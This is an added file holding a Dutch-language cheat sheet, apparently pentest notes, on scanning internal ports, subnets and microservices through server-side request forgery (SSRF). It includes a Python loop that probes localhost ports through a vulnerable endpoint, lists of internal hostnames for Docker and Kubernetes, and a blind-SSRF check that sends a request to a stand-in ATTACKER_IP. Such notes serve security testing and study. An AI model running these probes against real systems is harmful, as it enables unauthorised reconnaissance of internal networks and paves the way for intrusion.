@@ -1,0 +1,28 @@
+# SSRF - Internal Port/Subnet Scanning
+# === Port scanning via SSRF ===
+# Blind: response verschil = open/closed
+# Open port: timeout of specifieke error
+# Closed port: connection refused (snel)
+# Veelgebruikte interne poorten:
+# 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL)
+# 5432 (PostgreSQL), 6379 (Redis), 8080 (Tomcat)
+# 8443 (Alt HTTPS), 9200 (Elasticsearch), 27017 (MongoDB)
+# === Subnet scanning ===
+# Probeer: http://10.0.0.1:PORT, http://172.16.0.1:PORT, http://192.168.1.1:PORT
+# === Python SSRF scanner ===
+# import requests
+# for port in [22,80,443,3306,5432,6379,8080,9200]:
+#     r = requests.post(ssrf_url, json={"url": f"http://127.0.0.1:{port}/"})
+#     print(f"Port {port}: {r.status_code} - {len(r.content)} bytes")
+# === Microservice discovery ===
+# Probeer bekende service namen:
+# http://api-gateway:8000, http://auth-service:3000
+# http://user-service:5000, http://admin:8080
+# Docker: http://host.docker.internal:PORT
+# Kubernetes: http://SERVICE.NAMESPACE.svc.cluster.local
+# === Blind SSRF bevestiging ===
+# Submit: http://ATTACKER_IP/ssrf_confirm
+# Check access log voor inkomende request
+# User-Agent onthult backend library (python-requests, Java, curl)
+# Tip: Response time verschil = poort open/closed indicatie
+# Tip: Error message verschil is betrouwbaarder dan timing
